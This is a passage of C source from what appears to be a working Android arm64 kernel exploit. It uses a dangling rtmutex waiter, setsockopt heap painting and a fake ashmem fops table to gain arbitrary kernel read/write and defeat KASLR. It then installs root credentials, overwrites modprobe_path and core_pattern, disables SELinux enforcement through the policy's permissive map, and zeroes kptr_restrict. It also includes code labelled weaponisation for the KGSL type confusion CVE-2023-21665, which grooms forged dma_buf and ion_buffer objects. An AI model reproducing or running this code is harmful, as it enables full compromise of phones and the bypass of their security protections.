            env_flag("SSOPT_HOLD", 0), env_flag("SSOPT_QUIET_EXIT", 1),
            env_flag("SSOPT_OWNER0", 1), env_flag("SSOPT_NO_TREE", 0),
            env_flag("SSOPT_NO_PRIO", 0), env_flag("SSOPT_LOCKPROBE", 0));
    (void)0;
    fsync(1);   /* panic loses the page cache: force the log to disk */
    /* The dangling waiter lives on THIS thread's kernel stack (SP0-0x1b0).
     * ret_to_user -> work_pending -> do_notify_resume() runs AFTER our paint
     * whenever TIF_SIGPENDING / TIF_NOTIFY_RESUME is set; its frame (entry sp
     * = SP0-0x190) writes a saved x29/x16 pair over SP0-0x188..0x179 (that is
     * waiter->task@0x30 and the top of waiter->lock@0x38), and task_work
     * callbacks reach waiter+0x08/+0x10 -- exactly the high-entropy garbage
     * seen in kpr/kpP/kpPB (rb_erase_cached+0x20 with a bogus rb_right).
     * Block every blockable signal (recalc_sigpending() then clears
     * TIF_SIGPENDING) and make one return-to-userspace so pending task_work is
     * flushed BEFORE the paint: the setsockopt() exit path then has no work to
     * run and the painted waiter survives until the consumer's walk. */
    if (env_flag("SSOPT_QUIET_EXIT", 1)) {
      static int ssopt_exit_quiet;
      if (!ssopt_exit_quiet) {
        sigset_t all;
        sigfillset(&all);
        pthread_sigmask(SIG_BLOCK, &all, NULL);
        ssopt_exit_quiet = 1;
      }
      (void)syscall(SYS_getpid);
    }
    errno = 0;
    /* Always copy the whole 0x60-byte buffer: buf[0x10..0x5f] is exactly
     * waiter+0x00..waiter+0x4f (tree_entry/task/lock/prio/deadline), and the
     * kernel caps the length itself with min(optlen, 0xfe). */
    /* SSOPT_NO_PRIO: stop before buf[0x50] (prio/deadline) so they keep their
     * stale values, exactly like the ghostlock53/54 baseline. */
    socklen_t paint_len = (env_flag("SSOPT_BASELINE", 0) ||
                           env_flag("SSOPT_LOCKPROBE", 0) ||
                           env_flag("SSOPT_NO_PRIO", 0)) ? 0x50 : 0x60;
    int ret = setsockopt(sock_paint_fd, SOL_SOCKET, 1000, buf, paint_len);
    int saved_errno = errno;
    if (env_flag("SSOPT_LOG", 0))
      pr_info("ssopt paintret ret=%d errno=%d fd=%d base=%016zx task=%016zx "
              "lock=%016zx\n",
              ret, saved_errno, sock_paint_fd, page_base, fake_task, fake_lock);
    atomic_store(&pselect_select_done, 1);
    atomic_store(&punch_consume_go, attempt);
    /* HOLD: block inside the kernel for the whole walk window.
     * Rotating in userspace is NOT safe: an IRQ taken while T is at EL0 is
     * serviced on T's kernel stack, descends ~0x1b0 and overwrites the waiter
     * (measured: rb_erase_cached+0x20 with a high-entropy rb_right in
     * kpr/kpP/kpPB; silent bail in PA/QA; hang in the delay=0 run).  Blocked in
     * select(), IRQ frames land far below the current frame and the paint is
     * frozen.  Timeout is well above the consumer's 20 ms delay. */
    if (env_flag("SSOPT_HOLD", 0) && ssopt_hold_r >= 0 && ssopt_hold_r < 64) {
      fd_set h_in, h_out, h_ex;
      FD_ZERO(&h_in); FD_ZERO(&h_out); FD_ZERO(&h_ex);
      FD_SET(ssopt_hold_r, &h_in);          /* empty pipe: never ready */
      struct timeval h_tv = { .tv_sec = 1, .tv_usec = 0 };
      select(64, &h_in, &h_out, &h_ex, &h_tv);
    }
    for (int spin = 0;
         spin < (env_flag("SSOPT_HOLD", 0) ? 100000000 : 2000000000) &&
           !atomic_load(&pselect_walk_done);
         spin++) {
      __asm__ volatile("yield" ::: "memory");
    }
    if (env_flag("WRITE4_SCRATCH", 0)) {
      /* Self-test of the whole chain (paint -> chain[7] rb_erase_cached ->
       * write) with the target inside our own page: page[SSOPT_PG(SCRATCH+0x40)]
       * must become ssopt_write_pc (== fake_fops).  Zero risk for ashmem. */
      pr_info("ssopt scratch readback +%.0fms walked=%d page[%#zx]=%016zx "
              "want=%016zx\n",
              fops_elapsed_ms(&t0), atomic_load(&pselect_walk_done),
              SSOPT_PG(SCRATCH_OFF + 0x40),
              (uintptr_t)ssopt_page_readback(SSOPT_PG(SCRATCH_OFF + 0x40)),
              (uintptr_t)ssopt_write_pc);
    }
    if (env_flag("SSOPT_PEEK", 0)) {
      /* Read-only view of what the walk did to the fake page.  page[0x108]
       * (fake_fops->llseek) becomes the rb_right value only if chain[7]
       * rb_erase_cached() actually ran with our painted tree_entry. */
      pr_info("ssopt peek walked=%d pc=%016zx right=%016zx misc_fops=%016zx\n",
              atomic_load(&pselect_walk_done),
              (uintptr_t)ssopt_write_pc, (uintptr_t)ssopt_write_right,
              (uintptr_t)data_addr(ASHMEM_MISC_FOPS));
      pr_info("ssopt peek lock[wlock=%016zx rb_root=%016zx leftmost=%016zx] "
              "W0[rb_l=%016zx pi_pc=%016zx pi_r=%016zx pi_l=%016zx] "
              "fops[read=%016zx llseek=%016zx] right_slot=%016zx scratch=%016zx\n",
              (uintptr_t)ssopt_page_readback(SSOPT_PG(LOCK_OFF) + 0x00),
              (uintptr_t)ssopt_page_readback(SSOPT_PG(LOCK_OFF) + 0x08),
              (uintptr_t)ssopt_page_readback(SSOPT_PG(LOCK_OFF) + 0x10),
              (uintptr_t)ssopt_page_readback(SSOPT_PG(W0_OFF) + 0x10),
              (uintptr_t)ssopt_page_readback(SSOPT_PG(W0_OFF) + 0x18),
              (uintptr_t)ssopt_page_readback(SSOPT_PG(W0_OFF) + 0x20),
              (uintptr_t)ssopt_page_readback(SSOPT_PG(W0_OFF) + 0x28),
              (uintptr_t)ssopt_page_readback(SSOPT_PG(FOPS_OFF) + 0x10),
              (uintptr_t)ssopt_page_readback(SSOPT_PG(FOPS_OFF) + 0x08),
              (uintptr_t)ssopt_page_readback(SSOPT_PG(RIGHT_OFF) + 0x00),
              (uintptr_t)ssopt_page_readback(SSOPT_PG(SCRATCH_OFF) + 0x40));
      fsync(1);
    }
    pr_info("ssopt post paint +%.0fms ret=%d errno=%d walked=%d\n",
            fops_elapsed_ms(&t0), ret, saved_errno,
            atomic_load(&pselect_walk_done));
    atomic_store(&punch_consume_go, 0);
    calls = atomic_load(&consumer_calls);
    success = atomic_load(&consumer_success);
    pr_info("ssopt done attempt=%d calls=%d success=%d delay=%d step=%d errno=%d\n",
            attempt, calls, success, delay_usec, cfi_last_step, cfi_last_errno);
    if (calls > 0 && success > 0) {
      if (!route_only_mode && !env_flag("SSOPT_NO_CFI", 0)) {
        try_cfi_stage();
      } else if (env_flag("SSOPT_NO_CFI", 0)) {
        pr_info("ssopt NO_CFI: walk done (calls=%d success=%d), skipping cfi "
                "stage\n", calls, success);
        fsync(1);
      }
      break;
    }
  }
}

int repair_fake_fops_llseek(int fd) {
  uint64_t llseek = text_addr(NOOP_LLSEEK);
  uint64_t after = 0;
  uintptr_t slot = fake_fops + FOPS_LLSEEK_OFF;
  ssize_t wr = configfs_write_once(fd, slot, &llseek, sizeof(llseek));
  ssize_t rd = configfs_read_once(fd, slot, &after, sizeof(after));
  return wr == (ssize_t)sizeof(llseek) &&
         rd == (ssize_t)sizeof(after) &&
         after == llseek;
}

int refresh_fake_fops_text(int fd) {
  struct fops_slot {
    size_t off;
    uint64_t value;
  } slots[] = {
    {FOPS_READ_OFF, text_addr(CONFIGFS_READ_FILE)},
    {FOPS_WRITE_OFF, text_addr(CONFIGFS_BIN_WRITE_ITER)},
    {FOPS_IOCTL_OFF, text_addr(ASHMEM_IOCTL)},
    {FOPS_COMPAT_IOCTL_OFF, text_addr(ASHMEM_COMPAT_IOCTL)},
    {FOPS_MMAP_OFF, text_addr(ASHMEM_MMAP)},
    {FOPS_OPEN_OFF, text_addr(ASHMEM_OPEN)},
    {FOPS_RELEASE_OFF, text_addr(ASHMEM_RELEASE)},
    {FOPS_SPLICE_READ_OFF, text_addr(COPY_SPLICE_READ)},
    {FOPS_SHOW_FDINFO_OFF, text_addr(ASHMEM_SHOW_FDINFO)},
  };

  for (size_t i = 0; i < sizeof(slots) / sizeof(slots[0]); i++) {
    uintptr_t target = fake_fops + slots[i].off;
    if (kernel_write_data(fd, target, &slots[i].value,
        sizeof(slots[i].value)) !=
        (ssize_t)sizeof(slots[i].value)) {
      return 0;
    }
  }
  return 1;
}

int leak_kernel_base(int fd) {
  /* Known slide -> real ashmem_fops via canonical image mapping.
   * data_addr's linear alias needs an unknown phys delta (BAN_GIAO 22.2). */
  kaslr_fops_alias = (kaslr_slide != 0) ? canon_addr(ASHMEM_FOPS)
                                        : p0_data_alias(ASHMEM_FOPS);
  kaslr_open_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_OPEN_OFF);
  kaslr_ioctl_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_IOCTL_OFF);
  kaslr_mmap_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_MMAP_OFF);
  kaslr_release_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_RELEASE_OFF);
  kaslr_show_fdinfo_ptr =
    kernel_read64(fd, kaslr_fops_alias + FOPS_SHOW_FDINFO_OFF);

  pr_info("kaslr read: alias=%016llx open=%016llx ioctl=%016llx mmap=%016llx "
          "rel=%016llx fdin=%016llx\n",
          (unsigned long long)kaslr_fops_alias,
          (unsigned long long)kaslr_open_ptr,
          (unsigned long long)kaslr_ioctl_ptr,
          (unsigned long long)kaslr_mmap_ptr,
          (unsigned long long)kaslr_release_ptr,
          (unsigned long long)kaslr_show_fdinfo_ptr);
  fsync(1);
  /* SHOW_FDINFO gate: this kernel's ashmem_fops has show_fdinfo == 0 */
  if (!is_kernel_ptr(kaslr_open_ptr) || !is_kernel_ptr(kaslr_ioctl_ptr) ||
      !is_kernel_ptr(kaslr_mmap_ptr) || !is_kernel_ptr(kaslr_release_ptr)) {
    kaslr_step = 1;
    return 0;
  }

  kaslr_base = kaslr_open_ptr - (ASHMEM_OPEN - KIMAGE_TEXT_BASE);
  kaslr_slide = kaslr_base - KIMAGE_TEXT_BASE;
  kaslr_done = 1;
  kaslr_expected_ioctl = text_addr(ASHMEM_IOCTL);
  kaslr_expected_mmap = text_addr(ASHMEM_MMAP);
  kaslr_expected_release = text_addr(ASHMEM_RELEASE);
  kaslr_expected_show_fdinfo = text_addr(ASHMEM_SHOW_FDINFO);

  if (kaslr_ioctl_ptr != kaslr_expected_ioctl ||
      kaslr_mmap_ptr != kaslr_expected_mmap ||
      kaslr_release_ptr != kaslr_expected_release) {
    kaslr_done = 0;
    kaslr_step = 2;
    return 0;
  }

  if (!refresh_fake_fops_text(fd)) {
    kaslr_done = 0;
    kaslr_step = 3;
    return 0;
  }

  kaslr_step = 0;
  return 1;
}

int restore_slide_boot_id(int fd) {
  uintptr_t boot_id_data = SLIDE_RANDOM_BOOT_ID_DATA;
  slide_bootid_want = slide_canon_addr(SLIDE_SYSCTL_BOOTID);
  configfs_read_once(
      fd, boot_id_data, &slide_bootid_before, sizeof(slide_bootid_before));
  slide_bootid_restore_ret =
    configfs_write_once(
        fd, boot_id_data, &slide_bootid_want, sizeof(slide_bootid_want));
  configfs_read_once(
      fd, boot_id_data, &slide_bootid_after, sizeof(slide_bootid_after));
  pr_info("slide restore boot_id data pid=%d ret=%zd before=%016llx "
          "want=%016llx after=%016llx errno=%d\n",
          getpid(), slide_bootid_restore_ret,
          (unsigned long long)slide_bootid_before,
          (unsigned long long)slide_bootid_want,
          (unsigned long long)slide_bootid_after, errno);
  return slide_bootid_restore_ret == (ssize_t)sizeof(slide_bootid_want) &&
         slide_bootid_after == slide_bootid_want;
}

int install_child_root(int fd) {
  if (env_flag("CFG_PHYSRW", 1)) {
    install_configfs_physrw(fd);
  } else if (!install_pipe_physrw(fd)) {
    return 0;
  }
  if (!env_flag("SKIP_UMH", 0)) {
    if (install_umh_root(fd)) return 1;
  }
  if (env_flag("SKIP_CRED", 0)) return 0;
  return install_android_root(fd);
}

int try_cfi_stage(void) {
  cfi_attempts++;
  /* Undo the walk's clobber of the fake fops table (owner/llseek etc.) before
   * misc_open() dereferences it. */
  ssopt_repair_fake_fops_page();
  int fd = open_ashmem_device();
  int dirty = 0;
  int can_read_back = 0;

  if (fd < 0) {
    cfi_last_step = 11;
    cfi_last_errno = errno;
    pr_info("cfi open failed path=%s errno=%d\n", ashmem_path, errno);
    return 0;
  }

  pr_info("cfi attempt=%d fd=%d path=%s fake_fops=%016zx target=%016zx "
          "ioctl=%016llx open=%016llx write_iter=%016llx\n",
          cfi_attempts, fd, ashmem_path, fake_fops, binwrite_target,
          (unsigned long long)text_addr(ASHMEM_IOCTL),
          (unsigned long long)text_addr(ASHMEM_OPEN),
          (unsigned long long)text_addr(CONFIGFS_BIN_WRITE_ITER));

  uintptr_t misc_fops = (kaslr_slide != 0) ? canon_addr(ASHMEM_MISC_FOPS)
                                           : data_addr(ASHMEM_MISC_FOPS);
  char payload[] = "CFI_FRIENDLY_CONFIGFS_BIN_WRITE_OK";
  ssize_t n =
    configfs_write_once(fd, binwrite_target, payload, sizeof(payload));
  cfi_write_ret = n;
  pr_info("cfi write ret=%zd errno=%d\n", n, errno);
  if (n != (ssize_t)sizeof(payload)) {
    cfi_last_step = 1;
    cfi_last_errno = errno;
    goto fail;
  }
  dirty = 1;
  cfi_dirty_seen = 1;

  if (!repair_fake_fops_llseek(fd)) {
    cfi_last_step = 2;
    cfi_last_errno = errno;
    goto fail;
  }
  cfi_read_slot_ret = sizeof(uint64_t);
  can_read_back = 1;

  char readback[sizeof(payload)];
  memset(readback, 0, sizeof(readback));
  ssize_t r =
    configfs_read_once(fd, binwrite_target, readback, sizeof(readback));
  cfi_read_ret = r;
  pr_info("cfi read ret=%zd errno=%d\n", r, errno);
  if (r != (ssize_t)sizeof(readback) ||
      memcmp(readback, payload, sizeof(payload)) != 0) {
    cfi_last_step = 3;
    cfi_last_errno = errno;
    goto fail;
  }

  uint64_t before = 0;
  ssize_t rb = configfs_read_once(fd, misc_fops, &before, sizeof(before));
  fops_before = before;
  pr_info("cfi fops_before ret=%zd value=%016llx want=%016zx errno=%d\n",
          rb, (unsigned long long)before, fake_fops, errno);
  if (rb != (ssize_t)sizeof(before) || before != fake_fops) {
    cfi_last_step = 4;
    cfi_last_errno = errno;
    goto fail;
  }

  /* Optional: overwrite modprobe_path (MP_PATH env) while the gadget is live.
   * One fast configfs write, then the normal restore/exit path runs (no long
   * gl-shell window, which wedges the device). */
  {
    const char *mp = getenv("MP_PATH");
    if (mp && *mp) {
      size_t mplen = strlen(mp) + 1;
      if (mplen > 256) mplen = 256;
      uintptr_t mp_addr = data_addr(MODPROBE_PATH);
      ssize_t mw = configfs_write_once(fd, mp_addr, mp, mplen);
      char rb[64];
      memset(rb, 0, sizeof(rb));
      ssize_t rr = configfs_read_once(fd, mp_addr, rb, sizeof(rb) - 1);
      uint8_t z = 0;
      ssize_t sr = configfs_write_once(fd, data_addr(SELINUX_ENFORCING), &z, 1);
      uint32_t kz = 0;
      ssize_t kr = configfs_write_once(fd, data_addr(KPTR_RESTRICT), &kz, sizeof(kz));
      uint32_t krb = 0xffffffffu;
      configfs_read_once(fd, data_addr(KPTR_RESTRICT), &krb, sizeof(krb));
      const char *cp = "|/data/local/tmp/mphelper";
      ssize_t cpr =
        configfs_write_once(fd, data_addr(CORE_PATTERN), cp, strlen(cp) + 1);
      pr_info("modprobe_path @%016zx <- '%s' wr=%zd rd=%zd rb='%s' "
              "selinux_off=%zd kptr_wr=%zd kptr_now=%u core_wr=%zd errno=%d\n",
              (size_t)mp_addr, mp, mw, rr, rb, sr, kr, krb, cpr, errno);
      fsync(1);

      /* Mark the kernel domain permissive in the LOADED POLICY so that
       * security_compute_av[_user]() sets AVD_FLAGS_PERMISSIVE for it.  That is
       * what lets `echo 0 > /sys/fs/selinux/enforce` pass; the kernel then emits
       * the real SELNL_MSG_SETENFORCE(0) notice and init's cached userspace
       * libselinux AVC finally reloads as permissive -> property_service allows
       * setprop.  A raw selinux_enforcing write alone is invisible to userspace
       * (see docs/SELINUX_USERSYNC.md).
       * Layout: selinux_ss.policydb@+8, policydb.permissive_map@+0x1C0.
       * permissive_map is empty, so supply a fake ebitmap_node (next/maps[6]/
       * startbit) in the unused core_pattern buffer. */
      {
        uintptr_t pm   = data_addr(SELINUX_SS) + SELINUX_PMAP_OFF;
        uintptr_t node = data_addr(CORE_PATTERN);   /* 128 B scratch */
        unsigned char nb[64];
        memset(nb, 0, sizeof(nb));
        for (int i = 0; i < 6; i++) memset(nb + 8 + i * 8, 0xff, 8); /* maps[]=~0 */
        uint32_t startbit = (SELINUX_TYPE_KERNEL / SELINUX_EBITMAP_SIZE)
                            * SELINUX_EBITMAP_SIZE;
        uint32_t highbit  = startbit + SELINUX_EBITMAP_SIZE;
        memcpy(nb + 56, &startbit, 4);
        ssize_t nw = configfs_write_once(fd, node, nb, 60);
        uint64_t nodep = (uint64_t)node;
        configfs_write_once(fd, pm, &nodep, 8);
        configfs_write_once(fd, pm + 8, &highbit, 4);
        uint64_t rb0 = 0; uint32_t rb1 = 0;
        configfs_read_once(fd, pm, &rb0, 8);
        configfs_read_once(fd, pm + 8, &rb1, 4);
        pr_info("permissive_map @%016zx node=%016zx startbit=%u highbit=%u "
                "wr=%zd rb_node=%016zx rb_highbit=%u errno=%d\n",
                (size_t)pm, (size_t)node, startbit, highbit,
                nw, (size_t)rb0, rb1, errno);
        fsync(1);
      }

      /* Diagnostic: locate this process's file->private_data for an fd, to lay
       * groundwork for heap-grooming a KGSL type-confusion victim (CVE-2023-21665).
       * Reads only.  Scans task_struct for the `files` pointer (offset varies). */
      {
        int pfd = (int)fd;
        const char *pfe = getenv("PROBE_FD");
        if (pfe && *pfe) pfd = atoi(pfe);
        uint32_t me = (uint32_t)getpid();
        const char *pte = getenv("PROBE_TGID");
        if (pte && *pte) me = (uint32_t)strtoul(pte, NULL, 0);
        uintptr_t head = data_addr(INIT_TASK_TASKS);
        uintptr_t canon = canon_addr(INIT_TASK_TASKS);
        uint64_t entry = 0;
        configfs_read_once(fd, head, &entry, sizeof(entry));
        uintptr_t task = 0;
        for (int i = 0; i < 8192; i++) {
          if (entry == (uint64_t)canon || entry == (uint64_t)head) break;
          if (!is_direct_ptr(entry)) break;
          uintptr_t t = (uintptr_t)entry - TASK_TASKS_OFF;
          uint32_t pid = 0;
          configfs_read_once(fd, t + TASK_PID_OFF, &pid, sizeof(pid));
          if (pid == me) { task = t; break; }
          if (configfs_read_once(fd, t + TASK_TASKS_OFF, &entry, sizeof(entry))
              != (ssize_t)sizeof(entry)) break;
        }
        pr_info("probe: me=%u task=%016zx fd=%d\n",
                me, (size_t)task, pfd);
        if (is_direct_ptr(task)) {
          for (uintptr_t tf = 0x840; tf <= 0x960; tf += 8) {
            uint64_t P = 0;
            configfs_read_once(fd, task + tf, &P, sizeof(P));
            if (!is_direct_ptr(P)) continue;
            uint64_t fdt = 0, fdarr = 0, file = 0, priv = 0;
            configfs_read_once(fd, P + 0x20, &fdt, sizeof(fdt));
            if (!is_direct_ptr(fdt)) continue;
            configfs_read_once(fd, fdt + 0x8, &fdarr, sizeof(fdarr));
            if (!is_direct_ptr(fdarr)) continue;
            configfs_read_once(fd, fdarr + (uint64_t)pfd * 8, &file, sizeof(file));
            if (!is_direct_ptr(file)) continue;
            configfs_read_once(fd, file + 0xd0, &priv, sizeof(priv));
            uint64_t q[8] = {0};
            if (is_direct_ptr(priv)) configfs_read_once(fd, (uintptr_t)priv, q, sizeof(q));
            pr_info("probe: tf=%03zx files=%016zx fdt=%016zx fdarr=%016zx file=%016zx priv=%016zx\n",
                    (size_t)tf, (size_t)P, (size_t)fdt, (size_t)fdarr,
                    (size_t)file, (size_t)priv);
            pr_info("probe: priv[+00..+3f]=%016zx %016zx %016zx %016zx %016zx %016zx %016zx %016zx\n",
                    (size_t)q[0], (size_t)q[1], (size_t)q[2], (size_t)q[3],
                    (size_t)q[4], (size_t)q[5], (size_t)q[6], (size_t)q[7]);
            /* Optional: groom the victim so dma_buf_attach()/map_attachment()
             * walk a controlled object instead of crashing in mutex_lock. */
            const char *pp = getenv("PATCH");
            if (pp && *pp && is_direct_ptr(priv)) {
              uintptr_t A = (uintptr_t)priv;
              uintptr_t ot = data_addr(CORE_PATTERN) + 64;   /* fake dma_buf_ops */
              uint64_t self = (uint64_t)(A + 16);
              uint64_t z = 0;
              configfs_write_once(fd, A + 16, &self, 8);     /* attachments.next */
              configfs_write_once(fd, A + 24, &self, 8);     /* attachments.prev */
              configfs_write_once(fd, A + 40, &z, 8);        /* lock = unlocked */
              for (int k = 0; k < 16; k++) configfs_write_once(fd, ot + k * 8, &z, 8);
              configfs_write_once(fd, A + 32, &ot, 8);       /* ops -> fake table */
              uint64_t q2[8] = {0};
              configfs_read_once(fd, A, q2, sizeof(q2));
              pr_info("probe: PATCHED ops_tbl=%016zx priv[%016zx %016zx %016zx %016zx %016zx %016zx %016zx %016zx]\n",
                      (size_t)ot, (size_t)q2[0], (size_t)q2[1], (size_t)q2[2],
                      (size_t)q2[3], (size_t)q2[4], (size_t)q2[5], (size_t)q2[6],
                      (size_t)q2[7]);
            }
          }
        }
        fsync(1);
      }

      /* KGSL_IONPROBE=1: allocate a real ion buffer and dump struct ion_buffer
       * so we can confirm its field offsets on this kernel before faking one. */
      {
        const char *ip = getenv("KGSL_IONPROBE");
        if (ip && *ip) {
          /* NOTE: repointing our own cred is caught by RKP (CRED PROTECTION
           * VIOLATION); /dev/ion is 0664 system:system so this open just fails
           * with EACCES as uid 2000.  Kept only as a shape check. */
          struct ion_allocation_data ia;
          memset(&ia, 0, sizeof ia);
          ia.len = 0x4000; ia.heap_id_mask = 0xffffffffu;
          int ifd = open("/dev/ion", O_RDWR);
          pr_info("ionprobe: open=%d errno=%d\n", ifd, errno); fsync(1);
          if (ifd >= 0) {
            int ra = ioctl(ifd, ION_IOC_ALLOC_, &ia);
            pr_info("ionprobe: alloc ret=%d fd=%u errno=%d\n", ra, ia.fd, errno); fsync(1);
            if (ra == 0 && ia.fd) {
              uint32_t me = (uint32_t)getpid();
              uintptr_t head = data_addr(INIT_TASK_TASKS);
              uintptr_t canon = canon_addr(INIT_TASK_TASKS);
              uint64_t entry = 0; uintptr_t task = 0;
              configfs_read_once(fd, head, &entry, sizeof entry);
              for (int i = 0; i < 8192; i++) {
                if (entry == (uint64_t)canon || entry == (uint64_t)head) break;
                if (!is_direct_ptr(entry)) break;
                uintptr_t t = (uintptr_t)entry - TASK_TASKS_OFF;
                uint32_t pid = 0;
                configfs_read_once(fd, t + TASK_PID_OFF, &pid, sizeof pid);
                if (pid == me) { task = t; break; }
                if (configfs_read_once(fd, t + TASK_TASKS_OFF, &entry, sizeof entry)
                    != (ssize_t)sizeof entry) break;
              }
              uint64_t P2 = 0, fdt2 = 0, fda2 = 0, file2 = 0, dbuf2 = 0, ops2 = 0, ibuf = 0;
              if (is_direct_ptr(task)) {
                configfs_read_once(fd, task + 0x880, &P2, 8);
                if (is_direct_ptr(P2)) configfs_read_once(fd, P2 + 0x20, &fdt2, 8);
                if (is_direct_ptr(fdt2)) configfs_read_once(fd, fdt2 + 0x8, &fda2, 8);
                if (is_direct_ptr(fda2)) configfs_read_once(fd, fda2 + (uint64_t)ia.fd * 8, &file2, 8);
                if (is_direct_ptr(file2)) configfs_read_once(fd, file2 + 0xd0, &dbuf2, 8);
                if (is_direct_ptr(dbuf2)) {
                  configfs_read_once(fd, dbuf2 + 0x20, &ops2, 8);
                  configfs_read_once(fd, dbuf2 + 0x98, &ibuf, 8);
                }
              }
              pr_info("ionprobe: task=%016zx fda=%016zx file=%016zx dbuf=%016zx ops=%016zx ibuf=%016zx\n",
                      (size_t)task, (size_t)fda2, (size_t)file2, (size_t)dbuf2,
                      (size_t)ops2, (size_t)ibuf);
              if (is_direct_ptr(ibuf)) {
                for (int k = 0; k < 6; k++) {
                  uint64_t q[4] = {0};
                  configfs_read_once(fd, ibuf + k * 0x20, q, sizeof q);
                  pr_info("ionprobe: ib+%02x = %016zx %016zx %016zx %016zx\n",
                          k * 0x20, (size_t)q[0], (size_t)q[1], (size_t)q[2], (size_t)q[3]);
                }
              }
              fsync(1);
            }
          }
        }
      }

      /* NOTE: do not add a "dump kernel .text" helper here - with
       * CONFIG_HARDENED_USERCOPY=y a copy_to_user() from .text hits
       * "kernel BUG at mm/usercopy.c:72" (report_usercopy) and panics.  Offsets
       * were instead read off the crash PC dumps (see docs/KGSL_CVE_2023_21665.md).
       */

      /* In-process CVE-2023-21665 weaponisation test (KGSL_DRM=1):
       * open /dev/dri/renderD128 (permitted now that SELinux is permissive),
       * create a GEM + writable MAP_SHARED (-> vma->vm_file->private_data is a
       * drm_file, not a dma_buf), locate+groom that object via arbitrary R/W,
       * then fire IOCTL_KGSL_MAP_USER_MEM(ADDR) at it so we can see how far the
       * type-confused object gets past mutex_lock(). */
      {
        const char *kd = getenv("KGSL_DRM");
        if (kd && *kd) {
          struct drm_mode_create_dumb cd; memset(&cd, 0, sizeof cd);
          cd.width = 64; cd.height = 64; cd.bpp = 32;
          struct drm_mode_map_dumb md; memset(&md, 0, sizeof md);
          int dfd = open("/dev/dri/renderD128", O_RDWR);
          pr_info("kgsl_drm: open renderD128=%d errno=%d\n", dfd, errno); fsync(1);
          if (dfd >= 0) {
            int r1 = ioctl(dfd, DRM_IOCTL_CREATE_DUMB_, &cd);
            int r2 = -1; md.handle = cd.handle;
            if (r1 == 0) r2 = ioctl(dfd, DRM_IOCTL_MAP_DUMB_, &md);
            pr_info("kgsl_drm: create_dumb=%d handle=%u map_dumb=%d off=0x%llx size=%llu errno=%d\n",
                    r1, cd.handle, r2, (unsigned long long)md.offset,
                    (unsigned long long)cd.size, errno); fsync(1);
            if (r2 == 0) {
              void *p = mmap(NULL, cd.size, PROT_READ | PROT_WRITE, MAP_SHARED,
                             dfd, md.offset);
              pr_info("kgsl_drm: mmap=%p errno=%d\n", p, errno); fsync(1);
              if (p != MAP_FAILED) {
                uint32_t me = (uint32_t)getpid();
                uintptr_t head = data_addr(INIT_TASK_TASKS);
                uintptr_t canon = canon_addr(INIT_TASK_TASKS);
                uint64_t entry = 0;
                configfs_read_once(fd, head, &entry, sizeof(entry));
                uintptr_t task = 0;
                for (int i = 0; i < 8192; i++) {
                  if (entry == (uint64_t)canon || entry == (uint64_t)head) break;
                  if (!is_direct_ptr(entry)) break;
                  uintptr_t t = (uintptr_t)entry - TASK_TASKS_OFF;
                  uint32_t pid = 0;
                  configfs_read_once(fd, t + TASK_PID_OFF, &pid, sizeof(pid));
                  if (pid == me) { task = t; break; }
                  if (configfs_read_once(fd, t + TASK_TASKS_OFF, &entry, sizeof(entry))
                      != (ssize_t)sizeof(entry)) break;
                }
                uintptr_t priv = 0;
                uint64_t P = 0, fdt = 0, fdarr = 0, file = 0;
                if (is_direct_ptr(task)) {
                  configfs_read_once(fd, task + 0x880, &P, sizeof(P));
                  if (is_direct_ptr(P)) configfs_read_once(fd, P + 0x20, &fdt, sizeof(fdt));
                  if (is_direct_ptr(fdt)) configfs_read_once(fd, fdt + 0x8, &fdarr, sizeof(fdarr));
                  if (is_direct_ptr(fdarr)) configfs_read_once(fd, fdarr + (uint64_t)dfd * 8, &file, sizeof(file));
                  if (is_direct_ptr(file)) configfs_read_once(fd, file + 0xd0, &priv, sizeof(priv));
                }
                pr_info("kgsl_drm: task=%016zx dfd=%d files=%016zx fdt=%016zx fdarr=%016zx file=%016zx priv=%016zx\n",
                        (size_t)task, dfd, (size_t)P, (size_t)fdt, (size_t)fdarr,
                        (size_t)file, (size_t)priv);
                uint64_t qorig[64] = {0};
                uintptr_t A_saved = 0;
                uintptr_t gSL = 0;   /* forged scatterlist slot (for the KGW fire) */
                if (is_direct_ptr(priv)) {
                  uintptr_t A = (uintptr_t)priv;
                  A_saved = A;
                  configfs_read_once(fd, A, qorig, sizeof(qorig));
                  uintptr_t ot = data_addr(CORE_PATTERN) + 64;
                  uint64_t self = (uint64_t)(A + 16), z = 0;
                  configfs_write_once(fd, A + 16, &self, 8);
                  configfs_write_once(fd, A + 24, &self, 8);
                  configfs_write_once(fd, A + 40, &z, 8);
                  for (int k = 0; k < 16; k++) configfs_write_once(fd, ot + k * 8, &z, 8);
                  const char *sgt = getenv("KGSL_SGT");
                  if (sgt && *sgt) {
                    /* The shipped 4.14.190 kernel's ion_dma_buf_attach does:
                     *   ldr x25,[dmabuf,#0xa0]   (buffer = dmabuf->priv)
                     *   ldr x26,[x25,#0x80]      (buffer->sg_table)
                     * so make the fake ion_buffer satisfy every plausible offset:
                     * priv at 0x98 *and* 0xa0, sg_table at 0x70/0x78/0x80,
                     * attachments self-linked at 0x88/0x90. */
                    uint64_t vs = (uint64_t)VMEMMAP_START;   /* arm64: fixed vmemmap base */
                    uintptr_t FB = A + 0x100, GT = A + 0x1A0, SL = A + 0x1B0;
                    gSL = SL;
                    for (int k = 0; k < 20; k++) configfs_write_once(fd, FB + k * 8, &z, 8);
                    configfs_write_once(fd, FB + 0x70, &GT, 8);       /* sg_table? */
                    configfs_write_once(fd, FB + 0x78, &GT, 8);       /* sg_table? */
                    configfs_write_once(fd, FB + 0x80, &GT, 8);       /* sg_table? (or att.next) */
                    uint64_t fbself = (uint64_t)(FB + 0x88);
                    configfs_write_once(fd, FB + 0x88, &fbself, 8);   /* attachments */
                    configfs_write_once(fd, FB + 0x90, &fbself, 8);   /* attachments */
                    configfs_write_once(fd, GT + 0x00, &SL, 8);       /* sg_table.sgl */
                    uint32_t one = 1;
                    configfs_write_once(fd, GT + 0x08, &one, 4);      /* nents */
                    configfs_write_once(fd, GT + 0x0c, &one, 4);      /* orig_nents */
                    /* struct page* of the target physical page.
                     * pfn_to_page(pfn) = VMEMMAP_START - (ms>>12) + pfn, so for a
                     * raw phys: page = VMEMMAP_START + ((phys-ms)>>12)*0x40.
                     * Default target = the victim object's own (slab) page. */
                    uint64_t pfn;
                    const char *sp = getenv("KGSL_SGT_PHYS");
